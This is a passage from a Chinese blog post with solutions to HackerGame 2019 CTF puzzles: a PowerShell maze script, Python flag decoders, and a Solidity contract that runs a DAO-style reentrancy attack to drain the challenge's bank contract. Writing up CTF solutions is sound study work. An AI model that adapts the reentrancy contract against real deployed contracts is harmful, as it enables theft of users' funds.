+<span class=ln>19</span>        <span class=nv>$nextPost</span> <span class=p>=</span> <span class=no>[Tuple[int, int]]</span><span class=p>::</span><span class=n>new</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>X</span><span class=p>,</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Y</span><span class=p>)</span>
+<span class=ln>20</span>
+<span class=ln>21</span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$dire</span> <span class=o>-eq</span> <span class=s2>&#34;Left&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>22</span>            <span class=nv>$nextPost</span> <span class=p>=</span> <span class=no>[Tuple[int, int]]</span><span class=p>::</span><span class=n>new</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>X</span> <span class=p>-</span> <span class=n>1</span><span class=p>,</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Y</span><span class=p>)</span>
+<span class=ln>23</span>
+<span class=ln>24</span>            <span class=k>if</span> <span class=p>(</span><span class=nv>$d</span> <span class=o>-eq</span> <span class=s2>&#34;Right&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>25</span>                <span class=nv>$isScan</span> <span class=p>=</span> <span class=nv>$false</span>
+<span class=ln>26</span>            <span class=p>}</span>
+<span class=ln>27</span>        <span class=p>}</span>
+<span class=ln>28</span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$dire</span> <span class=o>-eq</span> <span class=s2>&#34;Up&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>29</span>            <span class=nv>$nextPost</span> <span class=p>=</span> <span class=no>[Tuple[int, int]]</span><span class=p>::</span><span class=n>new</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>X</span><span class=p>,</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Y</span> <span class=p>+</span> <span class=n>1</span><span class=p>)</span>
+<span class=ln>30</span>            <span class=k>if</span> <span class=p>(</span><span class=nv>$d</span> <span class=o>-eq</span> <span class=s2>&#34;Down&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>31</span>                <span class=nv>$isScan</span> <span class=p>=</span> <span class=nv>$false</span>
+<span class=ln>32</span>            <span class=p>}</span>
+<span class=ln>33</span>        <span class=p>}</span>
+<span class=ln>34</span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$dire</span> <span class=o>-eq</span> <span class=s2>&#34;Right&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>35</span>            <span class=nv>$nextPost</span> <span class=p>=</span> <span class=no>[Tuple[int, int]]</span><span class=p>::</span><span class=n>new</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>X</span> <span class=p>+</span> <span class=n>1</span><span class=p>,</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Y</span><span class=p>)</span>
+<span class=ln>36</span>            <span class=k>if</span> <span class=p>(</span><span class=nv>$d</span> <span class=o>-eq</span> <span class=s2>&#34;Left&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>37</span>                <span class=nv>$isScan</span> <span class=p>=</span> <span class=nv>$false</span>
+<span class=ln>38</span>            <span class=p>}</span>
+<span class=ln>39</span>        <span class=p>}</span>
+<span class=ln>40</span>        <span class=k>if</span> <span class=p>(</span><span class=nv>$dire</span> <span class=o>-eq</span> <span class=s2>&#34;Down&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>41</span>            <span class=nv>$nextPost</span> <span class=p>=</span> <span class=no>[Tuple[int, int]]</span><span class=p>::</span><span class=n>new</span><span class=p>(</span><span class=nv>$_</span><span class=p>.</span><span class=n>X</span><span class=p>,</span> <span class=nv>$_</span><span class=p>.</span><span class=n>Y</span> <span class=p>-</span> <span class=n>1</span><span class=p>)</span>
+<span class=ln>42</span>            <span class=k>if</span> <span class=p>(</span><span class=nv>$d</span> <span class=o>-eq</span> <span class=s2>&#34;Up&#34;</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>43</span>                <span class=nv>$isScan</span> <span class=p>=</span> <span class=nv>$false</span>
+<span class=ln>44</span>            <span class=p>}</span>
+<span class=ln>45</span>        <span class=p>}</span>
+<span class=ln>46</span>
+<span class=ln>47</span>        <span class=k>if</span> <span class=p>(!(</span><span class=nv>$list</span> <span class=o>-contains</span> <span class=nv>$nextPost</span><span class=p>))</span> <span class=p>{</span>
+<span class=ln>48</span>            <span class=k>if</span> <span class=p>(</span><span class=nv>$isScan</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>49</span>                <span class=n>Sacn</span> <span class=s2>&#34;$path&#34;</span> <span class=nv>$dire</span>
+<span class=ln>50</span>            <span class=p>}</span>
+<span class=ln>51</span>        <span class=p>}</span>
+<span class=ln>52</span>        
+<span class=ln>53</span>    <span class=p>}</span>
+<span class=ln>54</span><span class=p>}</span>
+<span class=ln>55</span>
+<span class=ln>56</span><span class=n>Sacn</span> <span class=p>./</span><span class=n>Down</span> <span class=n>Right</span></code></pre></div><p>最大难题就是我不是 DotNet 教的（跑</p><h2 id=韭菜银行>韭菜银行</h2><p>第一小题可以直接看见 private 中 init 的值</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=ln> 1</span><span class=n>O</span> <span class=o>=</span> <span class=mi>1940577538063170034860903343625652396</span>
+<span class=ln> 2</span>
+<span class=ln> 3</span><span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
+<span class=ln> 4</span>
+<span class=ln> 5</span><span class=k>for</span> <span class=n>index</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>):</span>
+<span class=ln> 6</span>    <span class=n>b</span> <span class=o>=</span> <span class=p>(</span><span class=n>O</span> <span class=o>&gt;&gt;</span> <span class=p>(</span><span class=n>index</span> <span class=o>*</span> <span class=mi>4</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mh>0xF</span>
+<span class=ln> 7</span>
+<span class=ln> 8</span>    <span class=k>if</span> <span class=n>b</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>:</span>
+<span class=ln> 9</span>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span> <span class=o>+</span> <span class=mi>48</span><span class=p>)</span>
+<span class=ln>10</span>    <span class=k>else</span><span class=p>:</span>
+<span class=ln>11</span>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span> <span class=o>+</span> <span class=mi>87</span><span class=p>)</span>
+<span class=ln>12</span>    
+<span class=ln>13</span><span class=n>result</span><span class=o>.</span><span class=n>reverse</span><span class=p>()</span>
+<span class=ln>14</span><span class=k>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>result</span><span class=p>)))</span></code></pre></div><p>第二题是著名的 <code>The DAO</code> 的攻击</p><p>我写的攻击合约是这样的</p><div class=highlight><pre class=chroma><code class=language-solidity data-lang=solidity><span class=ln> 1</span><span class=kr>pragma solidity</span> <span class=o>&gt;=</span><span class=mi>0</span><span class=p>.</span><span class=mi>4</span><span class=p>.</span><span class=mi>26</span><span class=p>;</span>
+<span class=ln> 2</span>
+<span class=ln> 3</span><span class=kd>contract</span> <span class=n>Target</span> <span class=p>{</span>
+<span class=ln> 4</span>    <span class=kd>function</span> <span class=n>withdraw</span><span class=p>(</span><span class=kt>uint</span> <span class=n>amount</span><span class=p>)</span> <span class=kr>public</span><span class=p>;</span>
+<span class=ln> 5</span>    <span class=kd>function</span> <span class=n>get_flag_2</span><span class=p>(</span><span class=kt>uint</span> <span class=n>user_id</span><span class=p>)</span> <span class=kr>public</span><span class=p>;</span>
+<span class=ln> 6</span>    <span class=kd>function</span> <span class=n>deposit</span><span class=p>()</span> <span class=kr>public</span> <span class=kr>payable</span><span class=p>;</span>
+<span class=ln> 7</span><span class=p>}</span>
+<span class=ln> 8</span>
+<span class=ln> 9</span><span class=kd>contract</span> <span class=n>JCBankHacker</span> <span class=p>{</span>
+<span class=ln>10</span>    <span class=kt>address</span> <span class=n>owner</span><span class=p>;</span>
+<span class=ln>11</span>    <span class=kt>address</span> <span class=n>bank</span><span class=p>;</span>
+<span class=ln>12</span>    <span class=kt>uint</span> <span class=n>balanceInBank</span><span class=p>;</span>
+<span class=ln>13</span>    <span class=kt>uint</span> <span class=n>step</span><span class=p>;</span>
+<span class=ln>14</span>    
+<span class=ln>15</span>    <span class=kd>modifier</span> <span class=n>ownerOnly</span> <span class=p>{</span> <span class=nb>require</span><span class=p>(</span><span class=n>owner</span> <span class=o>==</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>);</span> <span class=kr>_</span><span class=p>;</span> <span class=p>}</span>
+<span class=ln>16</span>    
+<span class=ln>17</span>    <span class=n>constructor</span> <span class=p>(</span><span class=kt>address</span> <span class=n>b</span><span class=p>)</span> <span class=kr>public</span> <span class=p>{</span>
+<span class=ln>18</span>        <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
+<span class=ln>19</span>        <span class=n>bank</span> <span class=o>=</span> <span class=n>b</span><span class=p>;</span>
+<span class=ln>20</span>        <span class=n>step</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+<span class=ln>21</span>    <span class=p>}</span>
+<span class=ln>22</span>    
+<span class=ln>23</span>    <span class=kd>function</span> <span class=n>setBankAddr</span><span class=p>(</span><span class=kt>address</span> <span class=n>bankAddr</span><span class=p>)</span> <span class=n>ownerOnly</span> <span class=p>{</span>
+<span class=ln>24</span>        <span class=n>bank</span> <span class=o>=</span> <span class=n>bankAddr</span><span class=p>;</span>
+<span class=ln>25</span>    <span class=p>}</span>
+<span class=ln>26</span>    
+<span class=ln>27</span>    <span class=kd>function</span> <span class=n>killWorld</span><span class=p>()</span> <span class=n>ownerOnly</span> <span class=p>{</span>
+<span class=ln>28</span>        <span class=nb>selfdestruct</span><span class=p>(</span><span class=n>owner</span><span class=p>);</span>
+<span class=ln>29</span>    <span class=p>}</span>
+<span class=ln>30</span>    
+<span class=ln>31</span>    <span class=kd>function</span> <span class=n>getFlag</span><span class=p>()</span> <span class=n>ownerOnly</span> <span class=p>{</span>
+<span class=ln>32</span>        <span class=n>Target</span> <span class=n>bankInstance</span> <span class=o>=</span> <span class=n>Target</span><span class=p>(</span><span class=n>bank</span><span class=p>);</span>
+<span class=ln>33</span>        <span class=n>bankInstance</span><span class=p>.</span><span class=n>get_flag_2</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+<span class=ln>34</span>    <span class=p>}</span>
+<span class=ln>35</span>    
+<span class=ln>36</span>    <span class=c1>// Attack implements
+</span><span class=ln>37</span><span class=c1></span>    <span class=kd>function</span> <span class=p>()</span> <span class=kr>payable</span> <span class=p>{</span>
+<span class=ln>38</span>        <span class=n>Target</span> <span class=n>bankInstance</span> <span class=o>=</span> <span class=n>Target</span><span class=p>(</span><span class=n>bank</span><span class=p>);</span>
+<span class=ln>39</span>        
+<span class=ln>40</span>        <span class=k>if</span> <span class=p>(</span><span class=n>step</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>41</span>            <span class=n>bankInstance</span><span class=p>.</span><span class=n>deposit</span><span class=p>.</span><span class=nb>value</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>)();</span>
+<span class=ln>42</span>            <span class=n>step</span> <span class=o>+=</span> <span class=mi>1</span><span class=p>;</span>
+<span class=ln>43</span>            <span class=n>bankInstance</span><span class=p>.</span><span class=n>withdraw</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
+<span class=ln>44</span>        <span class=p>}</span>
+<span class=ln>45</span>        
+<span class=ln>46</span>        <span class=k>if</span> <span class=p>(</span><span class=n>step</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+<span class=ln>47</span>            <span class=n>step</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
+<span class=ln>48</span>            <span class=n>bankInstance</span><span class=p>.</span><span class=n>withdraw</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
+<span class=ln>49</span>        <span class=p>}</span>
+<span class=ln>50</span>    <span class=p>}</span>
+<span class=ln>51</span><span class=p>}</span></code></pre></div><h2 id=没有-bug-的教务系统>没有 BUG 的教务系统</h2><p>只做了第一题, 发现密码化简一下是三个 XOR</p><div class=highlight><pre class=chroma><code class=language-python data-lang=python><span class=ln> 1</span><span class=n>origin</span> <span class=o>=</span> <span class=p>[</span>
+<span class=ln> 2</span>    <span class=mh>0x44</span><span class=p>,</span><span class=mh>0x00</span><span class=p>,</span><span class=mh>0x02</span><span class=p>,</span><span class=mh>0x41</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span><span class=mh>0x47</span><span class=p>,</span><span class=mh>0x10</span><span class=p>,</span><span class=mh>0x63</span><span class=p>,</span><span class=mh>0x00</span>
+<span class=ln> 3</span><span class=p>]</span>
+<span class=ln> 4</span>
+<span class=ln> 5</span><span class=kn>import</span> <span class=nn>sys</span>
+<span class=ln> 6</span>
+<span class=ln> 7</span><span class=n>r</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span>
+<span class=ln> 8</span><span class=n>r</span><span class=o>.</span><span class=n>reverse</span><span class=p>()</span>
+<span class=ln> 9</span>
+<span class=ln>10</span><span class=k>for</span> <span class=n>index</span> <span class=ow>in</span> <span class=n>r</span><span class=p>:</span>
+<span class=ln>11</span>    <span class=c1># (A XOR B) XOR i</span>
+<span class=ln>12</span>    <span class=n>origin</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>^=</span> <span class=n>index</span>
+<span class=ln>13</span>    <span class=n>origin</span><span class=p>[</span><span class=n>index</span><span class=p>]</span> <span class=o>^=</span> <span class=n>origin</span><span class=p>[</span><span class=n>index</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span>
+<span class=ln>14</span>
+<span class=ln>15</span><span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>origin</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]:</span>
+<span class=ln>16</span>    <span class=n>sys</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>char</span><span class=p>))</span></code></pre></div><h2 id=总结>总结</h2><p>这次 HackerGame 还是比较有意思的</p><p>据内部人员说一开始都想出难题（感觉到了）然后后面加了几个简单的题 然后题目数量爆炸 真的多</p><p>再加上这几天都在摸鱼没怎么搞（不是</p><p>最后拿了 top40 也满足了（跑</p><p><img src=https://i.loli.net/2019/10/23/lr5yfC2TInP8tqx.png alt=image.png></p></div></article><ul class=pagination><li class="page-item page-prev"><a href=https://blog.indexyz.me/archives/netlify-cms-in-blog/><div class=page-item-subtitle>上一篇</div><div class="page-item-title h5">使用 Netlify CMS 作为博客的 CMS</div></a></li><li class="page-item page-next"><a href=https://blog.indexyz.me/archives/dubbo-with-kotlin-in-spring-boot/><div class=page-item-subtitle>下一篇</div><div class="page-item-title h5">在 Spring Boot 中使用 Dubbo 以及 Kotlin 的坑</div></a></li></ul><div id=disqus_thread></div><script>new DisqusJS(JSON.parse("{\"api\":\"https://disqus.skk.moe/disqus/\",\"apikey\":\"VtpQwhbhO3YTIYSZdx1N8vOJ6me3une1xSIeXhpuPcE4jurE17UlJozkc9qhvjDw\",\"shortname\":\"indexyz-blog\",\"sitename\":\"Indexyz Blog\"}"))</script></section></div></main><footer class=page-footer><p>Copyright © 2018-2020, Indexyz</p><p>Power by
+<a href=https://gohugo.io/>Hugo</a> | Theme
+<a href=https://github.com/Indexyz/hugo-theme-index/>Index</a></p></footer></body></html>
